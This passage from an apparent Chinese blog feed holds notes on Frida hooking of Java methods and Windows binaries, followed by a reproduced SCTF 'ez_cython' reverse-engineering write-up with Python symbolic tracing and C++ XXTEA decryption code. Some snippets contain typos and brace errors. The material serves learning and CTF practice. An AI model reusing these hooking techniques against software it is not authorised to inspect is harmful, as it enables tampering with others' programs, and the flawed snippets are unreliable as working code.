<span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;<span class="comment">//Java.perform函数会把后面传入的函数在Java环境中执行，这里使用匿名函数比较方便，里面写hook函数，如果只有一个hook函数可以直接传hook函数</span></span><br><span class="line">        <span class="title function_">hook</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);<span class="comment">//根据GPT，该函数把传入的函数注册到本轮消息队列末尾，IO操作完成时触发的函数之后，不会阻塞IO操作同时也会尽可能快速地执行这个函数</span></span><br></pre></td></tr></table></figure><p>在hook中写自己的代码比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> xtea = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;example.encrypt.xtea&quot;</span>);<span class="comment">//加载对应类</span></span><br><span class="line">    xtea[<span class="string">&quot;encrypt&quot;</span>].<span class="property">implementation</span> = </span><br><span class="line">    <span class="keyword">function</span> (<span class="params">iArr, iArr2</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xtea.encrypt is called: iArr=<span class="subst">$&#123;iArr&#125;</span>, iArr2=<span class="subst">$&#123;iArr2&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">this</span>[<span class="string">&quot;encrypt&quot;</span>](iArr, iArr2);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xtea[<span class="string">&quot;encrypt&quot;</span>]可以通过[]取对应的方法，然后使用implementation来重写方法，后面跟一个相同传参的匿名函数，注意一定要在这个函数中调用<span class="variable language_">this</span>[<span class="string">&quot;encrypt&quot;</span>](iArr, iArr2);来调用原函数，如果这个函数有返回值可以令<span class="keyword">let</span> retV = <span class="variable language_">this</span>[<span class="string">&quot;encrypt&quot;</span>](iArr, iArr2);再<span class="variable language_">console</span>.<span class="property">log</span>出来</span><br></pre></td></tr></table></figure><h2 id="Windows">Windows</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;xxx.exe&quot;</span>)<span class="comment">//通过exe来寻找基址</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;inject success&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (base)&#123;</span><br><span class="line">        <span class="title class_">Intercepor</span>.<span class="title function_">attach</span>(base.<span class="title function_">add</span>(<span class="number">0xFFF</span>),&#123;<span class="comment">//这里的数值是目标指令地址相对于base的偏移量</span></span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;<span class="comment">//进入时执行</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args)</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;<span class="comment">//离开时执行</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(retval)</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是插指令的桩</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">functionsToHook.<span class="title function_">forEach</span>(<span class="function"><span class="params">functionName</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;xxx.dll&quot;</span>, functionName), &#123;<span class="comment">//通过导出表直接插函数</span></span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            xxx</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">           xxx</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是插函数的桩</p><hr><p>未完结</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 工具 </category>
          
          <category> 插桩及hook </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插桩 </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF_RE_复现</title>
      <link href="/posts/359c2434.html"/>
      <url>/posts/359c2434.html</url>
      
        <content type="html"><![CDATA[<p>死磕了那么久，还是没搞出来QAQ，太菜了，还是，不过这个WP给我了些做这种语言类题目的想法。按WP的方法复现了一下，确实可以直接出</p><h2 id="ez-cython">ez_cython</h2><p>对于这类题目，以往我只会hook一下传入参数和返回值。但是这个WP通过构造自己的类使其返回了符号值从而直接打印流程，十分NB，具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Symbol</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, Symbol):</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> + <span class="subst">&#123;other&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> + <span class="subst">&#123;<span class="built_in">hex</span>(other)&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__radd__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__add__(other)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__xor__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, Symbol):</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> ^ <span class="subst">&#123;other&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> ^ <span class="subst">&#123;<span class="built_in">hex</span>(other)&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rxor__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__xor__(other)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, other</span>):</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> &lt;&lt; <span class="subst">&#123;other&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, other</span>):</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> &gt;&gt; <span class="subst">&#123;other&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__and__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, Symbol):</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> &amp; <span class="subst">&#123;other&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> &amp; <span class="subst">&#123;<span class="built_in">hex</span>(other)&#125;</span>)&quot;</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">cout = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SA</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nums</span>):</span><br><span class="line">        self.nums = [Symbol(<span class="built_in">str</span>(num)) <span class="keyword">for</span> num <span class="keyword">in</span> nums]</span><br><span class="line">        self.count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="keyword">return</span> self.nums[index]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">copy</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> SA(self.nums)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.nums)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, index, value</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;new_<span class="subst">&#123;self.nums[index]&#125;</span> = <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">        self.nums[index] = Symbol(<span class="string">f&#x27;new_<span class="subst">&#123;self.nums[index]&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">global</span> cout </span><br><span class="line">        cout += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, value: <span class="built_in">object</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;self.nums&#125;</span> \n= \n<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.nums == value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inp = SA([<span class="string">f&quot;a[<span class="subst">&#123;i&#125;</span>]&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line">output = cy.sub14514(inp)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;round = <span class="subst">&#123;cout//<span class="number">32</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>根据输出可以一眼看出是xxtea</p><p>然后直接写XXTEA脚本就好QAQ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Arr.h&quot;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[] = &#123; <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">deXXTEA</span><span class="params">(Arr&amp; input)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"><span class="type">uint32_t</span> len = input.<span class="built_in">getsize</span>();</span><br><span class="line"><span class="type">uint32_t</span> round = <span class="number">60</span> / len + <span class="number">4</span>;</span><br><span class="line"><span class="type">uint32_t</span> sum = delta * round;</span><br><span class="line"><span class="type">int</span> t = <span class="number">32</span> * <span class="number">5</span> - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; round; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> now = len - <span class="number">1</span>; now &gt; <span class="number">-1</span>; now--)</span><br><span class="line">&#123;</span><br><span class="line">input[now] -= (((input[now - <span class="number">1</span>] &gt;&gt; <span class="number">3</span> ^ input[now + <span class="number">1</span>] &lt;&lt; <span class="number">3</span>) +</span><br><span class="line">(input[now + <span class="number">1</span>] &gt;&gt; <span class="number">4</span> ^ input[now - <span class="number">1</span>] &lt;&lt; <span class="number">2</span>)) ^ ((sum ^ input[now + <span class="number">1</span>]) +</span><br><span class="line">(key[t] ^ input[now - <span class="number">1</span>])));</span><br><span class="line">t--;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; ((now &amp; 2) ^ ((sum &gt;&gt; 3) &amp; 3)) &lt;&lt; &quot;\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line">sum -= delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>] = &#123; <span class="number">0x53</span>,<span class="number">0x79</span>,<span class="number">0x43</span>,<span class="number">0x31</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> data[] = &#123; <span class="number">0xf4e984ac</span>, <span class="number">0xcaf0191d</span>, <span class="number">0x576ffc19</span>, <span class="number">0x2ef90939</span>, <span class="number">0x585c0e45</span>, <span class="number">0x2eaa8337</span>, <span class="number">0x617f6b89</span>, <span class="number">0xf55432a7</span>, <span class="number">0xa81cb817</span>, <span class="number">0xbf1ee8c3</span>, <span class="number">0x656309c6</span>, <span class="number">0x92ace1cc</span>, <span class="number">0x8efeb57e</span>, <span class="number">0x39c000bb</span>, <span class="number">0x4d650916</span>, <span class="number">0x6a78dba7</span>, <span class="number">0xeba5c0a3</span>, <span class="number">0x92fdb0f3</span>, <span class="number">0xf4b5dea2</span>, <span class="number">0x2e7098d9</span>, <span class="number">0x112df304</span>, <span class="number">0xc60e9667</span>, <span class="number">0xf5b523ec</span>, <span class="number">0x7c8eb381</span>, <span class="number">0x2720ac77</span>, <span class="number">0xb8939ede</span>, <span class="number">0x8428a41a</span>, <span class="number">0x288ac504</span>, <span class="number">0xca50bcfd</span>, <span class="number">0x2992ba6f</span>, <span class="number">0x4222d1a6</span>, <span class="number">0x876c84df</span></span><br><span class="line">&#125;;</span><br><span class="line">Arr* test = <span class="keyword">new</span> <span class="built_in">Arr</span>(data, <span class="number">32</span>);</span><br><span class="line"><span class="comment">//XXTEA(*test, (uint32_t*)key);</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; *test;</span></span><br><span class="line"><span class="comment">//deXXTEA(*test, (uint32_t*)key);</span></span><br><span class="line"><span class="built_in">deXXTEA</span>(*test);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str[<span class="number">33</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">str[i] = (test-&gt;<span class="built_in">getarr</span>())[i];</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; str;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Arr.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;initializer_list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Arr</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">size_t</span> size;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Arr</span>(<span class="type">size_t</span> s);</span><br><span class="line"><span class="built_in">Arr</span>(<span class="type">uint32_t</span>* p, <span class="type">unsigned</span> s);</span><br><span class="line"><span class="built_in">Arr</span>(std::initializer_list&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; init);</span><br><span class="line">~<span class="built_in">Arr</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">getsize</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">getarr</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> Arr&amp; obj);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>&amp; <span class="keyword">operator</span>[](<span class="type">unsigned</span> i);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">begin</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">end</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Arr.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Arr.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(<span class="type">size_t</span> s) : <span class="built_in">size</span>(s), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">uint32_t</span>[s]) &#123;</span><br><span class="line">std::<span class="built_in">fill_n</span>(arr, s, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(<span class="type">uint32_t</span>* p, <span class="type">unsigned</span> s) : <span class="built_in">Arr</span>(s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">&#123;</span><br><span class="line">arr[i] = p[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(std::initializer_list&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; init) :<span class="built_in">size</span>(init.<span class="built_in">size</span>()), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">unsigned</span> <span class="type">int</span>[init.<span class="built_in">size</span>()])</span><br><span class="line">&#123;</span><br><span class="line">std::<span class="built_in">copy</span>(init.<span class="built_in">begin</span>(), init.<span class="built_in">end</span>(), arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Arr::~<span class="built_in">Arr</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[] arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Arr::getsize</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::getarr</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span 